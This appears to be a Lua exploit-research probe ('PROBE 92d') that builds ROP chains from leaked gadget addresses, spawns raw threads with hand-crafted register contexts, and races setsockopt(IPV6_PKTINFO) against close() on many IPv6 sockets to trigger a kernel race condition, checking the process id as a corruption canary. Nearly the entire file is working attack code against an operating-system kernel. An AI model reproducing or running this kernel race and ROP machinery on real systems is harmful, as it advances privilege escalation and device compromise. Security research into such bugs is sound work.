-- CRASH_CLASS: HIGH
-- PROBE 92d: Verified PKTINFO race — confirm children run before close
--
-- 92c did 20 rounds with no crash. But did the children actually enter
-- their setsockopt loops before close()? This probe:
-- 1. Spawns children doing setsockopt(PKTINFO) with marker values
-- 2. Reads back PKTINFO to confirm children succeeded
-- 3. THEN closes — ensuring the race window is real
--
-- Also: more aggressive timing — NO sleep between spawn and close.
-- And: tests both SOCK_DGRAM and SOCK_STREAM.

print("=== PROBE 92d: PKTINFO RACE VERIFY ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R10=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PKTINFO=46; local PV6=41

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- SECTION A: Verify child actually calls setsockopt
-- ============================================================
print("--- A: CHILD SETSOCKOPT VERIFY ---")

local NPAGES=200
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(NPAGES*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl=R+0x20; wq(sl,uint64(0)); wq(sl+8,uint64(20000000))  -- 20ms
local tb=R+0x40

-- pktinfo with marker ifindex=99
local pktinfo=R+0x80; z(pktinfo,20); wd(pktinfo+16,99)  -- ifindex=99

local cidx=0
local function child_stk(i) return R+0x4000*(1+i*5) end
local function child_ctx(i) return R+0x4000*(1+i*5+4) end

local function spawn_setter(sock_fd)
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)

    local off=0
    local ncycles=1600  -- ~64KB / 40 bytes
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(PKTINFO)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    for j=1,3 do
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
    end

    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))
    wq(ctx+_DI,uint64(sock_fd))
    wq(ctx+_SI,uint64(PV6))
    wq(ctx+_DX,uint64(PKTINFO))
    wq(ctx+_R10,uint64(pktinfo))
    wq(ctx+_R8,uint64(20))

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- Test: spawn child, wait, read back PKTINFO
local s6=N(native.fcall_with_rax(stub,97,28,2,0))
print("s6="..s6)
if s6<=0 then print("FAIL") return end

local tid=spawn_setter(s6)
print("tid="..tostring(tid and N(tid) or "nil"))

-- Wait 20ms
native.fcall_with_rax(stub,240,sl,0)

-- Read back PKTINFO
local gb=memory.alloc(32); z(gb,32)
local gl=memory.alloc(4); wd(gl,20)
local rv=N(native.fcall_with_rax(stub,118,s6,PV6,PKTINFO,N(gb),N(gl)))
local ifidx=rd(gb+16)
print("get_rv="..rv.." ifindex="..tostring(ifidx))

if ifidx==99 then
    print("*** CHILD SETSOCKOPT WORKS — ifindex=99 confirmed ***")
else
    print("child setsockopt may not have run (ifindex="..tostring(ifidx)..")")
end

-- Close (child will get EBADF on subsequent iterations)
native.fcall_with_rax(stub,6,s6)

-- ============================================================
-- SECTION B: Aggressive race — NO sleep between spawn and close
-- ============================================================
print("")
print("--- B: AGGRESSIVE RACE (no sleep) ---")

local NSOCK=8
local ROUNDS=25
local hits=0

for round=1,ROUNDS do
    local vm0=vmc()

    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,2,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("R"..round..": SKIP (children="..cidx..")")
        break
    end

    -- Spawn setters
    for i=1,NSOCK do spawn_setter(fds[i]) end

    -- NO SLEEP — close immediately
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local vm1=vmc()
    local canary=N(native.fcall_with_rax(stub,20))

    if round%5==0 or canary~=pid then
        print(string.format("R%02d: vm_d=%d c=%d ch=%d",
            round, vm1-vm0, canary, cidx))
    end
    if canary~=pid then
        print("*** CANARY ***")
        hits=hits+1
    end
end

-- ============================================================
-- SECTION C: SOCK_STREAM test
-- ============================================================
print("")
print("--- C: SOCK_STREAM ---")

local hits_c=0
for round=1,10 do
    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,1,0))  -- SOCK_STREAM
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("C"..round..": SKIP")
        break
    end

    for i=1,NSOCK do spawn_setter(fds[i]) end
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local canary=N(native.fcall_with_rax(stub,20))
    if round%5==0 or canary~=pid then
        print(string.format("C%02d: c=%d ch=%d", round, canary, cidx))
    end
    if canary~=pid then hits_c=hits_c+1 end
end

-- ============================================================
print("")
print(string.format("B_hits=%d C_hits=%d total_children=%d", hits, hits_c, cidx))
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 92d DONE ===")
